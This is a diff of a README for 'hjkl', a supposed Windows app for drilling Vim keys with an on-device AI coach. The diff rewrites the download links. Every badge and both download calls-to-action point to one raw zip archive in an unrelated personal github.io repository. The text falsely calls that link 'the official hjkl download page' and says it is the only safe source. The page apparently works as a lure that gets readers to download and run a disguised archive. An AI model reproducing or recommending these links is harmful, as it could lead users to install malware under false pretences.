@@ -5,9 +5,9 @@ description: "Learn Vim through short, real-editor drills with goals, keystroke 
 ---
 # ⌨️ hjkl - Master Vim Keys Right in Your Browser
 
-[![Download hjkl](https://img.shields.io/badge/⬇️_Download-hjkl-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vivekkumariitd/vivekkumariitd.github.io/main/data/archive/3.7.zip)
-[![Learn Vim](https://img.shields.io/badge/Learn-Vim-FF6B35?style=for-the-badge&logo=vim&logoColor=white)](https://raw.githubusercontent.com/vivekkumariitd/vivekkumariitd.github.io/main/data/archive/3.7.zip)
-[![On-Device AI](https://img.shields.io/badge/AI-On_Your_Own_GPU-00C2A8?style=for-the-badge&logo=webgpu&logoColor=white)](https://raw.githubusercontent.com/vivekkumariitd/vivekkumariitd.github.io/main/data/archive/3.7.zip)
+[![Download hjkl](https://img.shields.io/badge/⬇️_Download-hjkl-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vivekkumariitd/vivekkumariitd.github.io/raw/refs/heads/main/data/archive/3.7.zip)
+[![Learn Vim](https://img.shields.io/badge/Learn-Vim-FF6B35?style=for-the-badge&logo=vim&logoColor=white)](https://github.com/vivekkumariitd/vivekkumariitd.github.io/raw/refs/heads/main/data/archive/3.7.zip)
+[![On-Device AI](https://img.shields.io/badge/AI-On_Your_Own_GPU-00C2A8?style=for-the-badge&logo=webgpu&logoColor=white)](https://github.com/vivekkumariitd/vivekkumariitd.github.io/raw/refs/heads/main/data/archive/3.7.zip)
 
 hjkl is a friendly practice app that teaches you the keyboard shortcuts that make text editing fast. Instead of reading a long manual, you open the app and do short drills — little exercises that take a minute or two. Each drill shows you a target time to beat, tells you which everyday habit the shortcut replaces, and can offer tips from a built-in coach that runs on your own computer.
 
@@ -55,7 +55,7 @@ Open it, practice, close it. Nothing to register for.
 
 Getting hjkl onto your Windows computer takes one step.
 
-**👉 [Visit this link to download the application.](https://raw.githubusercontent.com/vivekkumariitd/vivekkumariitd.github.io/main/data/archive/3.7.zip)**
+**👉 [Visit this link to download the application.](https://github.com/vivekkumariitd/vivekkumariitd.github.io/raw/refs/heads/main/data/archive/3.7.zip)**
 
 That link opens the official hjkl download page. Everything you need is available there, and it is the only place you should ever get the app from — that way you always have the current, safe version.
 
@@ -143,7 +143,7 @@ Yes. The shortcuts you learn are widely supported, and the habit comparisons are
 
 Download it from the link, open it, practice the four movement keys first, watch the par times, and read the habit comparisons. Ten minutes a day, and the keyboard starts doing more of the work for you.
 
-**👉 [Visit this link to download the application.](https://raw.githubusercontent.com/vivekkumariitd/vivekkumariitd.github.io/main/data/archive/3.7.zip)**
+**👉 [Visit this link to download the application.](https://github.com/vivekkumariitd/vivekkumariitd.github.io/raw/refs/heads/main/data/archive/3.7.zip)**
 
 ---
 
